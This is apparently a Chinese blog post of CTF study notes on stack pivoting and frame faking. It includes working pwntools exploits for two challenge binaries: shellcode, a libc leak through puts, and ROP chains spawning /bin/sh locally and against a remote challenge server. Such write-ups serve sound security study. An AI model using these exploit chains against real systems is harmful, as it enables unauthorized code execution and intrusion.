---
title: 花式栈溢出
date: 2023-04-24 20:37:48
tags:
---
本文是本人跟着ctf-wiki上学之后做的笔记，自认为写得比较详细

### 栈转移

栈转移是指劫持`SP`指针到我们能控制的位置，以便实现一些之前不方便的操作

一般来说需要使用该技巧的情况有：

- 可控的栈溢出字节数较少，难以构造长 payload 进行 rop
- 有PIE地址随机化，栈地址未知。可以通过劫持转移栈到已知地址
- 其他漏洞难利用，转换后更方便，比如把栈转移到堆空间后写rop

要求有：

- 可控程序执行流
- 可控`SP`指针

一般来说控制`SP`指针用`pop rsp/esp`

`__libc_csu_init`中就有这种gadgets，但要使用偏移

```python
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp  # 原本pop r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

此外，还有更加高级的 fake frame，要求有一段可以控制内容的内存，一般是如下：

- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
- heap。但是这个需要我们能够泄露堆地址。

#### X-CTF Quals 2016 - b0verfl0w

```
checksec: 什么都没开
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

IDA反编译：

```c
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin); # 读50个字符，不好构造长payload
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

这题的思路是在栈上填入短`shellcode`，然后想办法`jmp esp`，`EIP`就会跳到栈上。我们提前在栈上填入机器码处理`esp`，使`esp`指向`shellcode`后再次`jmp esp`

构造的payload结构如下：

`shellcode|padding|ebp|jmp_esp_addr|asm("sub esp, 0x?;jmp esp")`

```bash
# 查找 jmp esp
$ ROPgadget --binary b0verfl0w --only "jmp"|grep esp
0x08048504 : jmp esp
```

执行`sub esp`时`ESP`到shellcode的距离可以通过看payload长度计算出来

首先`shellcode+padding`是0x20

`ebp`0x4

`jmp_esp_addr` 0x4

我们需要设置`esp`到`shellcode`，而此时`esp`在`jmp_esp_addr`的后面指向asm，所以需要对`esp` - 0x28

exp：

```python
from pwn import *
sh = process("./b0verfl0w")

shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73"
shellcode += b"\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode.ljust(0x20, b'a') # 填充shellcode长度
sub_esp_jmp_esp = asm("sub esp, 0x28;jmp esp") #生成机器码
jmp_esp_addr = 0x08048504
payload = flat([shellcode, "bbbb", jmp_esp_addr, sub_esp_jmp_esp])
sh.sendline(payload)
sh.interactive()
```

### frame faking(栈伪造)

构建一个虚假的栈帧来控制程序的执行流。我们需要同时控制`IP`和`BP`寄存器，这样我们就能在控制程序执行流的同时也改变栈帧的位置

以下内容基于x86架构

这种攻击方式payload的格式一般如下：`buffer padding|fake ebp|leave_ret_addr|`其中`fake ebp`为我们构造的假栈帧的基址。注意这里多了`leave`指令

回顾`leave`指令的等效用法：`mov esp, ebp; pop ebp` 在执行此命令之前，`EBP`指向栈中saved ebp

执行后，`EBP`回到主调函数位置，`ESP`指向retaddr

而`ret`指令实际上等效于`pop eip`，执行后`ESP`完全回到主调函数的原位置

上面提到的payload中，`retaddr`被覆盖为`leave_ret_addr`，这导致程序ret后会再次执行`leave` `ret`

接下来的描述有点绕，在这里先明确一些代号：

- `ebp2`是一个值，这个值是一个内存地址，是我们最终想赋给寄存器`EBP`的值(使`EBP`指向这个地址)
- `ebp2_addr`是一个值，这个值是一个内存地址，该处内存保存着`ebp2`的值

假栈帧大致格式：

```

+---------------------+
| arg2 of function    | 高地址
+---------------------+
| arg1 of function    |
+---------------------+
| leave_ret_addr      |
+---------------------+
| target function addr|
+---------------------+
| ebp2                |
+---------------------+ <- ebp2_addr
```

payload的`fake ebp` 就是 `ebp2_addr`:

```
buffer padding|fake ebp|leave_ret_addr|
buffer padding|ebp2_addr|leave_ret_addr|
```

利用此payload，我们可以依次做以下事情：

```nasm
leave:
	mov esp, ebp
	pop ebp # 使ebp变为ebp2_addr

ret # run leave ret again

leave:
	mov esp, ebp # 使esp也变为ebp2_addr，这让esp指向了ebp2_addr
	pop ebp # 此时esp指向ebp2_addr，此操作会将该处内存的ebp2值赋给ebp

ret # return to target function 需要提前在ebp2_addr+4处写入target function addr

# after target function, return to leave_ret_addr
# 然后程序又会执行类似的操作。如果我们在ebp2指向的地址处也设置好了相应内容，就能继续劫持ebp+eip
# 当然，如果假栈帧能控制的大小足够长，我们也可以直接像以前一样构造纯粹的rop，不再借助leave ret
# 即假栈帧的结构为:

+---------------------+
| ...                 | 高地址
+---------------------+
| next_retaddr        |
+---------------------+
| arg2                |
+---------------------+
| arg1                |
+---------------------+
| pop_xxx_pop_xxx_ret |
+---------------------+
| target function addr|
+---------------------+
| ebp2                | 
+---------------------+ <- ebp2_addr
```


#### 2018 安恒杯 over.over

```
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}
```

这个题的思路是泄露libc执行execve，但可以看出read读96字节但buf长度已经有80字节，所以只能通过覆盖saved rbp和retaddr来劫持`RBP`
我们向buf上写入rop链，然后劫持`RSP`和`RBP`到此处，这就需要我们知道buf的地址

##### leak stack

我们使用`puts`函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址

我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`栈上的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数的`RBP`。我们需要计算`main`函数的`RBP`地址到`buf`的长度，长度值加上`main`函数的`RBP`即得到`buf`的地址。

一种简单的计算方法是调试，在`main`函数下断点看看`RBP`的值，然后运行到`sub_400676`看看`buf`的地址，直接一减就出来了。

另一种方法是看汇编，`main`函数中:

```nasm
.text:00000000004006C1                 mov     rbp, rsp
.text:00000000004006C4                 sub     rsp, 10h
```

这使`RBP`的值固定，`RSP`减0x10，也就是说`main`函数中`RSP`到`RBP`距离为0x10

随后运行到`call sub_400676()`：

```nasm
.text:0000000000400676                 push    rbp
.text:0000000000400677                 mov     rbp, rsp
.text:000000000040067A                 sub     rsp, 50h
```

这使得`RSP`向下移动了0x8+0x8+0x50=0x60。其中第一个0x8是`call`指令把返回地址压栈造成的

所以`RSP`到最初`main`函数`RBP`的距离是0x10+0x60=0x70

当我们泄露出`main`函数的`RBP`，我们对其减0x70，就能得到`buf`的地址了

##### exp：

本地打：

```python
from pwn import *
context.binary = "./over.over"

'''for debug
def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)
'''

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc # 本地打，可以直接获取libc

io.sendafter(b">", b'a' * 80)
# 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车"\0a"会被作为数据录入，直接影响到saved rbp

buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70
# 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到"\0"才会停
# 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到"\0"
# 而后面就是8字节的saved rbp，会被puts泄露出来
# 栈是由高地址向低地址生长，其最高字节一定是"\x7f"
# 根据小端序"高高低低"，"\x7f"在高地址也就是泄露出来的8字节的最后一个字节，故recvuntil(b"\x7f")
# 至于这里为什么切最后6个字节，原因是x64规定内存地址不能大于 0x00007FFFFFFFFFFF
# 6个字节长度，否则会抛出异常。所以栈地址一定保存在最后6字节中

success("buf -> {:#x}".format(buf))

pop_rdi_ret=0x400793
leave_ret = 0x4006be
#  DEBUG("b *0x4006B9\nc")
payload = flat([b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret])
# 这个payload先倒着看，依次对应的是retaddr和saved rbp
# 首先pop rbp使rbp指向buf，也就是payload写进栈中的"11111111"那个位置
# 然后ret到leave_ret，执行leave使rsp也指向buf，随后pop rbp把"11111111"弹出，rsp指向pop_rdi_ret
# ret到pop_rdi_ret，把puts的got表载入rdi，再ret调用puts来泄露got表得到偏移量
# puts再ret回到sub_400676了

io.sendafter(b">", payload)
libc.address = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - libc.sym['puts']
'''
这一步是实际地址减去偏移量得到libc基址
libc被加载到内存中的动态链接区域，这个区域在栈的下方，所以这里也使用"\x7f"作为结束符接受
对应的，对于32位程序，需要使用"\xf7"
u32(r.recvuntil('\xf7')[-4:])
+-------------------+  <--- 高地址
|       栈区        |
|                   |
|                   |
+-------------------+
|   动态链接区域    |
+-------------------+
|       堆区        |
|                   |
|                   |
+-------------------+
|       数据区      |
|  (data + bss)     |
+-------------------+
|       代码区      |
+-------------------+  <--- 低地址
'''

success("libc.address -> {:#x}".format(libc.address))

'''每台机子不一样
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"|grep -E "rsi|rdx"
0x0000000000090528 : pop rax ; pop rdx ; pop rbx ; ret
0x000000000011f497 : pop rdx ; pop r12 ; ret
0x0000000000090529 : pop rdx ; pop rbx ; ret
0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret
0x000000000002a743 : pop rsi ; pop r15 ; pop rbp ; ret
0x000000000002a3e3 : pop rsi ; pop r15 ; ret
0x000000000002be51 : pop rsi ; ret
'''
pop_rsi_ret=libc.address+0x2be51
pop_rdx_rbx_ret = libc.address+0x90529
# execve("/bin/sh", 0, 0)
print("/bin/sh ",hex(next(libc.search(b"/bin/sh"))))
print("execve", hex(libc.sym['execve']))
payload=flat([b'22222222', pop_rdi_ret, next(libc.search(b"/bin/sh")),pop_rsi_ret,p64(0),pop_rdx_rbx_ret,p64(0),p64(0xdeadbeef), libc.sym['execve'], (80 - 9*8 ) * b'2', buf - 0x30, 0x4006be])
# 此payload和之前的类似，但不同之处是最后是buf - 0x30
# 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置
# 执行完puts到最后程序ret又回到了sub_400676
# [b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret]
# 回想当我们正常进入sub_400676时push rbp之前，rsp指向的是payload中的leave_ret
# 而我们上一次通过ret进入sub_400676时push rbp之前，rsp指向payload中的0x400676的末尾
# 这两次rsp相差 (80 - 40) * '1'+ buf两段数据长0x30，也就是说rsp向下移动了0x30
# 所以第二次payload的"22222222"的填入地址减小了0x30
# 如果想不通就用gdb调试下，直接下断点看rsp值

io.sendafter(b">", payload)

io.interactive()
```

远程打：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.binary = "./over.over"
#io = process("./over.over")
io = remote("114.51.41.9", 11451)
elf = ELF("./over.over")

io.sendafter(b">", b'a' * 80)
buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70

success("buf -> {:#x}".format(buf))

pop_rdi_ret=0x400793
leave_ret = 0x4006be

payload = flat([b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret])

io.sendafter(b">", payload)
puts_addr = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0'))

libc = LibcSearcher("puts", puts_addr)
base = puts_addr - libc.dump("puts")
#bin_sh = libc.dump("str_bin_sh") + base
system = libc.dump("system") + base
# 远程打用execve要三个参数，有时找gadgets得用libc，就得去下载相应的libc，所以能用system就用system

'''
❯ ROPgadget --binary over.over --only "ret"
Gadgets information
============================================================
0x0000000000400509 : ret
'''
ret = 0x400509 # 栈对齐
payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), ret, system, (80 - 8*5)*b"a", buf - 0x30, leave_ret])
# 把字符串存栈里调用也可以

io.sendafter(b">", payload)
io.interactive()
```

### 待添加